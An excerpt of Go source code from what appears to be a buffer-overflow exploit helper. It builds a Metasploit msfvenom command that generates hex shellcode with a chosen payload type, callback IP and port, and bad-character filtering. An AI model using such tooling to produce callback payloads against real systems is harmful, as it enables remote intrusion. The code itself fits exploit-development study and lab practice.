...
func generate(c Config, off int, jmp string, bad string, ptype string, send bool, ip string, port int) {
	...
	cmd := exec.Command(venomCmd, fmt.Sprint("-p "+ptype), fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "--format hex", "-o payload.txt")
